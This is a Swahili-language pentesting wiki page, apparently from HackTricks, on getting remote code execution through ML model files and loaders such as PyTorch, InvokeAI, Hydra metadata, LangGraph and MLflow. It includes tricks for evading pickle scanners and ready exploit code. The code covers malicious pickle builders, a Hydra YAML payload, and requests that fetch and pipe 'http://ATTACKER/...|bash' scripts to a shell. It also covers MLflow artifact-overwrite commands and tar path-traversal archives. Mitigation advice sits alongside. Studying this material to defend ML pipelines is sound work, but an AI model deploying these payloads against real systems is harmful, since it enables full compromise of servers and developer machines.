# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Kupakia modeli ili kupata RCE

Modeli za Kujifunza kwa Mashine kwa kawaida hushirikiwa katika fomati mbalimbali, kama vile ONNX, TensorFlow, PyTorch, n.k. Modeli hizi zinaweza kupakiwa kwenye mashine za developers au mifumo ya production ili zitumike. Kwa kawaida modeli hazipaswi kuwa na code hasidi, lakini katika baadhi ya hali modeli inaweza kutumika kutekeleza code yoyote kwenye mfumo kama kipengele kilichokusudiwa au kutokana na udhaifu katika library ya kupakia modeli.

Jedwali lifuatalo linaorodhesha udhaifu wakilishi katika kundi hili:

| **Framework / Tool**        | **Udhaifu (CVE ikiwa ipo)**                                                    | **Njia ya RCE**                                                                                                                           | **Marejeo**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Deserialization isiyo salama katika* `torch.load` **(CVE-2025-32434)**                                                              | Pickle hasidi katika model checkpoint husababisha code kutekelezwa (hupita kinga ya `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + upakuaji wa modeli hasidi husababisha code kutekelezwa; RCE ya Java deserialization katika management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Deserialization isiyo salama ya checkpoint kupitia `torch.load` **(CVE-2025-23298)**                                           | Checkpoint isiyoaminika huanzisha pickle reducer wakati wa `load_model_trainer_states_from_checkpoint` → code hutekelezwa katika ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + hook isiyo salama ya MessagePack extension **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Ufunguo wa `filter` unaodhibitiwa na mtumiaji huingiza sintaksia ya SQL/JSON-path, `UNION SELECT` hutengeneza row bandia ya checkpoint, kisha deserialization ya `msgpack` hu-import na kuita code ya Python iliyochaguliwa na mshambuliaji | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (YAML isiyo salama) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Kupakia modeli kutoka YAML hutumia `yaml.unsafe_load` (code hutekelezwa) <br> Kupakia modeli yenye layer ya **Lambda** huendesha code yoyote ya Python          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (uchanganuzi wa TFLite)                                                                                          | Modeli ya `.tflite` iliyotengenezwa mahsusi husababisha integer overflow → uharibifu wa heap (uwezekano wa RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Kupakia modeli kupitia `joblib.load` hutekeleza pickle yenye payload ya `__reduce__` ya mshambuliaji                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (`np.load` isiyo salama) *inabishaniwa*                                                                              | `numpy.load` kwa chaguo-msingi iliruhusu object arrays za pickled – `.npy/.npz` hasidi husababisha code kutekelezwa                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Path ya external-weights ya modeli ya ONNX inaweza kutoka nje ya directory (kusoma faili zozote) <br> Tar ya modeli hasidi ya ONNX inaweza kubatilisha faili zozote (na kusababisha RCE) | |
| ONNX Runtime (design risk)  | *(Hakuna CVE)* ONNX custom ops / control flow                                                                                    | Modeli yenye custom operator huhitaji kupakia code asilia ya mshambuliaji; model graphs changamano hutumia vibaya logic kutekeleza computations zisizotarajiwa   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Kutumia model-load API huku `--model-control` ikiwa imewezeshwa huruhusu relative path traversal kuandika faili (kwa mfano, kubatilisha `.bashrc` ili kupata RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (heap overflows nyingi)                                                                         | Faili ya modeli ya GGUF iliyoharibika husababisha heap buffer overflows katika parser, na kuwezesha kutekeleza code yoyote kwenye mfumo wa mwathiriwa                     | |
| **Keras (fomati za zamani)**   | *(Hakuna CVE mpya)* Modelo ya zamani ya Keras H5                                                                                         | Modelo hasidi ya HDF5 (`.h5`) yenye code ya layer ya Lambda bado hutekeleza code inapopakiwa (Keras safe_mode hailindi fomati ya zamani – “downgrade attack”) | |
| **Nyingine** (kwa ujumla)        | *Kasoro ya muundo* – Pickle serialization                                                                                         | Tools nyingi za ML (k.m., fomati za modeli zinazotumia pickle, Python `pickle.load`) zitatekeleza code yoyote iliyoingizwa kwenye faili za modeli isipokuwa hatua za kupunguza hatari zitumike | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Metadata isiyoaminika inayopitishwa kwa `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Metadata/config ya modeli inayodhibitiwa na mshambuliaji huweka `_target_` kuwa callable yoyote (k.m., `builtins.exec`) → hutekelezwa wakati wa kupakia, hata kwa fomati “salama” (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Zaidi ya hayo, kuna baadhi ya modeli za Python zinazotumia pickle, kama zile zinazotumiwa na [PyTorch](https://github.com/pytorch/pytorch/security), zinazoweza kutumika kutekeleza code yoyote kwenye mfumo ikiwa hazitapakiwa kwa `weights_only=True`. Kwa hiyo, modeli yoyote inayotumia pickle inaweza kuwa hatarini zaidi kwa aina hii ya mashambulizi, hata ikiwa haijaorodheshwa kwenye jedwali hapo juu.

### Kukwepa ukaguzi tuli kwenye checkpoints zinazotumia pickle

Njia ya kupakia modeli inayotumia `pickle.load()`, `joblib.load()`, au `torch.load(..., weights_only=False)` bila vizuizi ni sehemu ya kutekeleza code, si parser tu.<sup>[[22]](#references)</sup> Katika PyTorch 2.6, `torch.load()` hutumia `weights_only=True` kwa chaguo-msingi ikiwa hakuna pickle module maalum iliyotolewa; mifano iliyo hapa chini inahitaji loader isiyo na vizuizi au programu inayozima kinga hii ili kupakia object isiyoungwa mkono.<sup>[[4]](#references)</sup> Matokeo safi ya uchanganuzi tuli hayabadili mpaka huo.<sup>[[21]](#references)</sup>

Tazama [Python pickle deserialization](../pentesting-web/deserialization/#pickle) kwa primitive ya msingi ya `__reduce__` na [Fickling's ML import allowlist](keras-model-deserialization-rce-and-gadget-hunting.md#ml-pickle-import-allowlisting-for-aiml-models-fickling) kwa ukaguzi wa imports wakati wa runtime.

#### Sajili callable, kisha itafute kwa `EXT2`

Pickle inaweza kuita `copyreg.add_extension` kupitia `REDUCE`, ikisajili jozi ya module/name chini ya nambari ya extension iliyochaguliwa na mshambuliaji. Baadaye, `EXT2` hutafuta callable hiyo kwa kutumia nambari hiyo, kisha `REDUCE` nyingine inaweza kuiita. Kwa hiyo, callable muhimu si operand ya opcode ya `GLOBAL` au `STACK_GLOBAL`. Binarly ilionyesha mbinu hii kwa `multiprocessing.util.spawnv_passfds`; scanners nne kati ya tano zilizotathminiwa hazikuitambua, huku SaferPickle ikiitambua. Mabadiliko ya registry na utatuzi wa `EXT2` hufanyika ndani ya operesheni ileile ya unpickling.<sup>[[21]](#references)[[22]](#references)</sup>

```text
GLOBAL       'copyreg add_extension'
BINUNICODE   'multiprocessing.util'
BINUNICODE   'spawnv_passfds'
BININT2      31337
TUPLE3
REDUCE       # register the extension
POP
EXT2         31337  # resolve the callable
# Push its arguments, then REDUCE to call it
```

Huu ni mchoro wa opcode, si checkpoint kamili: outer loader lazima ikubali pickle stream inayouzunguka. Scanner inayotafuta tu operands za `GLOBAL` kwa callables hatari hukosa lookup inayofuata; scanner isiyounga mkono `EXT2` inaweza kushindwa kabla ya kutoa uamuzi. Strict allowlist bado inaweza kukataa `copyreg.add_extension` yenyewe.<sup>[[21]](#references)</sup>

#### Ficha aina za code object zilizoundwa nyuma ya functions za kawaida

Mnyororo mwingine wa pickle unaweza kupata `FunctionType` kutoka kwa `type(copy.copy)` na `CodeType` kutoka kwa `type(copy.copy.__code__)`, kisha kuunda code object kutoka kwa bytecode iliyotolewa, kuifunga kama function, na kuiita. Toleo lililochapishwa hupata `__code__` kupitia `operator.methodcaller('__getattribute__', '__code__')`, kwa hiyo pickle haihitaji ku-import constructor yoyote kati ya hizo kwa jina. Mpangilio wa fields wa `CodeType(...)` na bytecode yake hutegemea toleo la CPython; payload iliyoundwa kwa interpreter tofauti inaweza kushindwa kabla ya kutekelezwa. SaferPickle bado iliashiria sample iliyoonyeshwa, lakini ikashusha kiwango chake hadi `suspicious`; scanners nyingine nne zilizotathminiwa hazikuigundua.<sup>[[21]](#references)[[22]](#references)</sup>

```python
from copy import copy
from operator import methodcaller
function_type = type(copy)
code_type = type(methodcaller('__getattribute__', '__code__')(copy))
# REDUCE can construct code_type(...) and function_type(code, {})
```

#### Anzisha upakiaji wa modeli ya pili kutoka kwa argument ya pickle

Pickle ya nje inaweza kuita `torch.storage._load_from_bytes` na kutumia modeli iliyoserialishwa inayodhibitiwa na mshambuliaji kama argument yake. Function hiyo huita `torch.load(io.BytesIO(b), weights_only=False)`, kwa hiyo modeli iliyopachikwa ndani huserialishwa bila kizuizi cha weights-only, ingawa kwa scanner ya opcode ya kiwango cha juu inaonekana kama bytes zilizopitishwa kwa callable moja. Upakiaji wa nje bado lazima uruhusu callable hiyo; `weights_only=True` haifanyi pickle ya nje kuikubali moja kwa moja. Scanners ambazo haziingii ndani ya bytes zilizopachikwa zinaweza kukosa msururu wa ndani wa `GLOBAL`/`REDUCE`.<sup>[[21]](#references)[[23]](#references)</sup>

#### Tatua jina la module ya zamani ya pickle wakati wa kupakia

Kwa pickle protocols zilizo chini ya 3, `fix_imports=True` ya Python kwa chaguomsingi hubadilisha rejeleo la `GLOBAL` la `commands.run` kuwa `subprocess.run` kupitia `_compat_pickle.IMPORT_MAPPING`. Kwa hiyo, scanner inayolinganisha mfuatano halisi wa jina la module na denylist ya `subprocess` inaweza kukosa callable itakayotumika wakati wa runtime. Hili linahitaji loader inayohifadhi mapping ya uoanifu na kukubali arguments zinazotokana nayo.<sup>[[21]](#references)[[24]](#references)[[25]](#references)</sup>

#### Pitisha checkpoint isiyo ya ZIP ili iepuke scanner inayoshughulikia ZIP pekee

Uteuzi wa format unaweza kushindwa bila kutegemea ukaguzi wa opcode: Binarly iligundua kuwa ModelScan 0.8.8 ilielekeza faili za `.bin`, `.pt`, `.pth`, na `.ckpt` kwa PyTorch scanner maalumu kwa ZIP, kisha ikaruka pickle stream isiyo ya ZIP badala ya kutumia scanner yake ya kawaida ya pickle. Pia iliandika kuhusu mpangilio wa zamani wa modeli za TAR ambao `torch.load()` hukubali lakini ModelScan na JFrog hazikukagua. Hizi ni mapungufu yanayotegemea matoleo ya scanner, si sifa za kila model scanner.<sup>[[21]](#references)</sup>

#### Tekeleza kabla parser tuli haijafikia mwisho wenye hitilafu

Scanner inayochanganua pickle yote kwa `pickletools.genops()` inaweza kutoa exception inapokutana na opcode iliyokatika baada ya `REDUCE` halali. Unrestricted unpickler huwa tayari imeshaendesha callable kabla haijakutana na sehemu hiyo ya mwisho, hata kama upakiaji mzima baadaye utatoa exception. Sample iliyoripotiwa iliweka `BINUNICODE` iliyokatika mara tu baada ya `REDUCE` iliyotekeleza kitendo, na kusababisha `pickletools.genops()` kushindwa huku athari ya awali ya kuandika faili ikiwa tayari imetokea. Hii hupita scanner ikiwa tu scanner inachukulia hitilafu ya uchanganuzi kama safi au inaruka faili. Inafaa tu pale athari inapokuwa muhimu bila modeli kurejeshwa kwa mafanikio; target inayohitaji upakiaji ukamilike inaweza kukataa artifact hiyo.<sup>[[21]](#references)</sup>

### Metadata ya Hydra → RCE (hufanya kazi hata kwa safetensors)

`hydra.utils.instantiate()` huingiza na kuita `_target_` yoyote yenye nukta ndani ya object ya configuration/metadata. Maktaba kama Hugging Face Transformers zinapopitisha **metadata ya modeli isiyoaminika** kwa `instantiate()`, mshambuliaji anaweza kutoa callable na arguments ambazo huendeshwa mara moja wakati wa upakiaji wa modeli (hakuna pickle inayohitajika).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Mfano wa payload (hufanya kazi katika `model_config.yaml` ya `.nemo`, `config.json` ya repo, au `__metadata__` ndani ya `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Key points:
- Hutekelezwa kabla ya uanzishaji wa model katika NeMo `restore_from/from_pretrained`, coders za uni2TS HuggingFace, na loaders za FlexTok.
- Orodha ya block ya string ya Hydra inaweza kukwepwa kupitia njia mbadala za import (k.m., `enum.bltns.eval`) au majina yanayotatuliwa na application (k.m., `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok pia huchanganua metadata iliyo katika mfumo wa string kwa kutumia `ast.literal_eval`, hivyo kuwezesha DoS (matumizi kupita kiasi ya CPU/memory) kabla ya mwito wa Hydra.

### 🆕  InvokeAI RCE kupitia `torch.load` (CVE-2024-12029)

`InvokeAI` ni web interface maarufu ya open-source ya Stable-Diffusion. Toleo **5.3.1 – 5.4.2** hufichua REST endpoint `/api/v2/models/install`, inayowaruhusu watumiaji kupakua na kupakia models kutoka URL zozote.<sup>[[1]](#references)</sup>

Kwa ndani, endpoint hatimaye huita:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Wakati faili iliyotolewa ni **checkpoint ya PyTorch (`*.ckpt`)**, `torch.load` hufanya **pickle deserialization**. Kwa kuwa maudhui yanatoka moja kwa moja kwenye URL inayodhibitiwa na mtumiaji, mshambuliaji anaweza kupachika object hasidi yenye method maalum ya `__reduce__` ndani ya checkpoint; method hiyo hutekelezwa **wakati wa deserialization**, na kusababisha **remote code execution (RCE)** kwenye seva ya InvokeAI.

Athari hii ilipewa nambari ya **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Mwongozo wa Exploitation

1. Tengeneza checkpoint hasidi:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Weka `payload.ckpt` kwenye seva ya HTTP unayoidhibiti (kwa mfano, `http://ATTACKER/payload.ckpt`).
3. Washa endpoint iliyo hatarini (hakuna uthibitishaji unaohitajika):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. InvokeAI inapopakua faili, huita `torch.load()` → gadget ya `os.system` huendeshwa na mshambulizi hupata uwezo wa kutekeleza msimbo katika muktadha wa mchakato wa InvokeAI.

Exploit iliyo tayari: moduli ya **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` huendesha mtiririko mzima kiotomatiki.<sup>[[3]](#references)</sup>

#### Masharti

•  InvokeAI 5.3.1-5.4.2 (bendera ya scan ni **false** kwa chaguomsingi)
•  `/api/v2/models/install` inaweza kufikiwa na mshambulizi
•  Mchakato una ruhusa za kutekeleza amri za shell

#### Hatua za kupunguza hatari

* Sasisha hadi **InvokeAI ≥ 5.4.3** – kiraka huweka `scan=True` kwa chaguomsingi na huchanganua programu hasidi kabla ya deserialization.<sup>[[2]](#references)</sup>
* Unapopakia checkpoints kwa njia ya programu, tumia `torch.load(file, weights_only=True)` au helper mpya ya [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Tekeleza allow-lists / saini kwa vyanzo vya model na endesha huduma ikiwa na ruhusa za chini kabisa.

> ⚠️ Kumbuka kwamba **format** yoyote inayotumia Python pickle (ikiwemo faili nyingi za `.pt`, `.pkl`, `.ckpt`, `.pth`) si salama kiasili kufanyiwa deserialization kutoka kwa vyanzo visivyoaminika.

---

Mfano wa hatua ya kupunguza hatari ya muda ikiwa ni lazima uendelee kutumia matoleo ya zamani ya InvokeAI nyuma ya reverse proxy:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE kupitia `torch.load` isiyo salama (CVE-2025-23298)

Transformers4Rec ya NVIDIA (sehemu ya Merlin) ilifichua loader ya checkpoint isiyo salama iliyokuwa ikiita moja kwa moja `torch.load()` kwenye paths zilizotolewa na mtumiaji. Kwa kuwa `torch.load` hutegemea Python `pickle`, checkpoint inayodhibitiwa na mshambuliaji inaweza kutekeleza code yoyote kupitia reducer wakati wa deserialization.<sup>[[5]](#references)</sup>

Path iliyo hatarini (kabla ya marekebisho): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Kwa nini hii husababisha RCE: Katika Python pickle, object inaweza kufafanua reducer (`__reduce__`/`__setstate__`) inayorejesha callable na arguments. Callable hiyo hutekelezwa wakati wa unpickling. Ikiwa object kama hiyo ipo kwenye checkpoint, hutekelezwa kabla ya weights zozote kutumika.

Mfano mdogo wa checkpoint hasidi:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Njia za uwasilishaji na ukubwa wa athari:
- Checkpoints/models zilizowekewa Trojan hushirikiwa kupitia repos, buckets au artifact registries
- Pipelines za kiotomatiki za resume/deploy zinazopakia checkpoints kiotomatiki
- Utekelezaji hufanyika ndani ya workers za training/inference, mara nyingi zikiwa na ruhusa za juu (kwa mfano, root ndani ya containers)

Suluhisho: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ilibadilisha matumizi ya moja kwa moja ya `torch.load()` na deserializer yenye vizuizi na orodha ya ruhusa, iliyotekelezwa katika `transformers4rec/utils/serialization.py`. Loader mpya huthibitisha aina/fields na huzuia callable zisizo za kawaida kutekelezwa wakati wa upakiaji.<sup>[[7]](#references)</sup>

Mwongozo wa kujilinda mahususi kwa checkpoints za PyTorch:
- Usifanye unpickle data isiyoaminika. Ikiwezekana, pendelea fomati zisizotekelezeka kama [Safetensors](https://huggingface.co/docs/safetensors/index) au ONNX.
- Ikiwa ni lazima utumie serialization ya PyTorch, hakikisha `weights_only=True` (inaungwa mkono katika matoleo mapya zaidi ya PyTorch) au tumia unpickler maalum yenye orodha ya ruhusa, sawa na patch ya Transformers4Rec.<sup>[[4]](#references)</sup>
- Hakikisha provenance/signatures za modeli na weka deserialization kwenye sandbox (seccomp/AppArmor; mtumiaji asiye root; FS yenye vizuizi na bila ufikiaji wa mtandao unaotoka).
- Fuatilia michakato child isiyotarajiwa kutoka kwa huduma za ML wakati wa kupakia checkpoint; fuatilia matumizi ya `torch.load()`/`pickle`.

Marejeo ya POC na matoleo yenye udhaifu/yaliyorekebishwa:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Loader yenye udhaifu kabla ya patch: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC ya checkpoint hasidi: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader baada ya patch: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Mfano – kutengeneza modeli hasidi ya PyTorch

- Unda modeli:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Pakia model:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

FaceDetection-DSFD ya Tencent ina endpoint ya `resnet` inayodeserialize data inayodhibitiwa na mtumiaji. ZDI ilithibitisha kuwa mshambuliaji wa mbali anaweza kumshawishi mwathiriwa kupakia ukurasa/faili hasidi, kuifanya itume blob iliyoundwa kwa makusudi kwenye endpoint hiyo, na kuchochea deserialization kama `root`, na kusababisha mfumo kuathiriwa kikamilifu.

Mtiririko wa exploit unafanana na matumizi mabaya ya kawaida ya pickle:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Gadget yoyote inayoweza kufikiwa wakati wa deserialization (constructors, `__setstate__`, framework callbacks, n.k.) inaweza kutumiwa kufanya shambulio kwa njia hiyo hiyo, bila kujali kama transport ilikuwa HTTP, WebSocket, au faili iliyowekwa kwenye directory inayofuatiliwa.



### LangGraph checkpointer SQLi → MessagePack RCE

Msururu huu wa shambulio unavutia kwa sababu mshambuliaji **hahitajiki kupakia faili hasidi ya model**. Badala yake, programu hufichua **API ya persistence ya AI-agent** (`get_state_history(..., filter=...)`), na ingizo la mtumiaji hufika kwenye query builder ya checkpointer.

#### 1. SQLi ya kimuundo kwenye filters za metadata

Muundo hatarishi wa SQLite ulionekana hivi:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Thamani huunganishwa baadaye, lakini `query_key` huunganishwa kwenye **mfuatano wa JSON path**, kwa hivyo `'` ndani ya ufunguo wa dictionary hutoka kwenye `'$.{query_key}'` na kuingiza SQL. Somo hilohilo linatumika kwa **JSON paths, identifiers, operators, `LIMIT`, na sehemu za TTL**: placeholders hulinda thamani pekee, si sintaksia ya kimuundo ya query.

#### 2. `UNION SELECT` inaweza kulenga sinks za downstream, si wizi wa data pekee

Query hurejesha `type` na bytes za `checkpoint` zilizosanifishwa, ambazo hutumiwa baadaye kama:

```python
self.serde.loads_typed((type, checkpoint))
```

Hiyo inamaanisha kuwa SQLi katika kifungu cha `WHERE` inaweza kuingiza **safu bandia ya matokeo**:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Ikiwa baadaye code itachanganua, itadeserialisha, itaandika au kutekeleza safu wima yoyote iliyochaguliwa, husisha safu wima hizo na sinks zake. Katika hali hii, safu ghushi hugeuza SQLi kuwa **deserialization inayodhibitiwa na mshambulizi**.

#### 3. Unsafe MessagePack extension hooks ni sawa na code gadgets

Njia ya `msgpack` ya LangGraph ilitumia extension hook maalum iliyofungua tuple iliyopachikwa na kutekeleza:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Kwa hiyo, kitu cha MessagePack extension kinachosimba kitu sawa na `("os", "system", "id > /tmp/pwned")` hu-import `os`, hupata `system`, na huendesha amri. Unapokagua AI frameworks, kagua **custom MessagePack/JSON/pickle revivers** ili kubaini dynamic imports, reflection, au arbitrary callable dispatch.

#### 4. Mbinu ya ukaguzi wa vitendo kwa agent frameworks

Kagua ingizo lolote linalodhibitiwa na mtumiaji linalofikia:
- state history / memory / replay / checkpoint listing APIs
- structured filter builders zinazozalisha vipande vya SQL au Redis query
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery paths zinazoamini rows zilizorejeshwa na persistence layer

Mnyororo huu mahususi uliathiri deployments za LangGraph zinazojiendesha zenyewe na kutumia **SQLite** au **Redis** checkpointers, pale ambapo watumiaji wasioaminika wangeweza kudhibiti `filter`. Matoleo yaliyorekebishwa yaliyoainishwa kwenye disclosure yalikuwa `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, na `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### MLflow PyFunc: overwrite ya artifact inayosababisha pickle RCE

MLflow PyFunc iliyoundwa kutoka kwa `PythonModel` inaweza kuhifadhi object iliyoserialishwa kama `python_model.pkl`. Metadata ya model hutaja `mlflow.pyfunc.model` kama loader yake, na utekelezaji wa MLflow hutumia jina hili la faili kuhifadhi Python model. Kwa hiyo, ruhusa ya kuandika kwenye artifact store inaweza kusababisha code execution katika application nyingine itakayopakia model baadaye.<sup>[[17]](#references)[[18]](#references)</sup>

Mnyororo unaotumika ni **ruhusa ya kuandika artifact → badilisha pickle → fanya inference consumer ipakie upya**. Kwa experiment inayotumia root ya proxied `mlflow-artifacts:/...`, orodhesha experiment, run na njia ya artifact ya model. Tracking server hutoa `GET` na `PUT` kwenye `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Reducer ndogo inaweza kutekeleza amri mara tu mtumiaji anapo-unpickle artifact. Kuunda payload kwa kutumia toleo la Python lililotajwa kwenye MLmodel huepusha matatizo ya uoanifu.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Anzisha operesheni inayopakia **modeli iliyopo**, kama vile kutabiri, kukadiria au kupeleka modeli. Usifanye mafunzo upya kwanza kwa sababu mafunzo yanaweza kubadilisha artifact hasidi na kuweka modeli mpya. Hitilafu ya programu haithibitishi kuwa unyonyaji haukufanikiwa: reducer hurejesha hali ya kutoka ya amri kama nambari badala ya modeli inayoweza kutumika. Anza na athari inayoonekana, kama vile ICMP au callback ya HTTP, kisha ibadilishe na payload ya mwisho.<sup>[[20]](#references)</sup>

Wakati wa tathmini, tofautisha ruhusa ya kuunda run na ruhusa ya kubatilisha artifacts za run nyingine. Kagua uthibitishaji na ruhusa za kusasisha za kila run, chunguza marekebisho yasiyotarajiwa ya `python_model.pkl`, na chukulia asili na uadilifu wa modeli kuwa sehemu ya mpaka wa utekelezaji. Msimbo wa sasa wa MLflow pia unaunga mkono kuweka `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` na unapendekeza kutumia artifacts za models-from-code badala ya kupakia data ya cloudpickle.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### Seva za modeli zilizo wazi na miundombinu ya ML

Kupakia modeli hasidi si njia pekee ya kutekeleza msimbo kwenye miundombinu ya ML. API za kuwasilisha kazi, endpoints za kuthibitisha msimbo na upakuaji wa modeli kutoka kwenye registry za huduma za AI zinazojipangia zinaweza kusababisha utekelezaji wa msimbo bila faili yoyote ya modeli. Tazama [Exposed Self-Hosted AI Services](AI-Exposed-Self-Hosted-AI-Services.md).

## Models to Path Traversal

Kama ilivyoelezwa katika [**chapisho hili la blogu**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), fomati nyingi za modeli zinazotumiwa na framework mbalimbali za AI zinategemea archives, kwa kawaida `.zip`. Kwa hivyo, huenda ikawezekana kutumia vibaya fomati hizi kufanya mashambulizi ya path traversal, na hivyo kuruhusu kusoma faili zozote kutoka kwenye mfumo ambako modeli inapakiwa.<sup>[[16]](#references)</sup>

Kwa mfano, kwa kutumia msimbo ufuatao unaweza kuunda modeli itakayounda faili kwenye saraka ya `/tmp` inapopakiwa:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Au, kwa kutumia msimbo ufuatao unaweza kuunda modeli ambayo itaunda symlink kuelekea saraka ya `/tmp` itakapopakiwa:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Uchambuzi wa kina: Keras .keras deserialization na kutafuta gadgets

Kwa mwongozo mahususi kuhusu mambo ya ndani ya .keras, RCE kupitia Lambda-layer, suala la arbitrary import katika matoleo ≤ 3.8, na ugunduzi wa gadgets ndani ya allowlist baada ya marekebisho, tazama:


{{#ref}}
keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec blog – "CVE-2024-12029 – InvokeAI: Deserialization ya Data Isiyoaminika"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Commit ya marekebisho ya InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
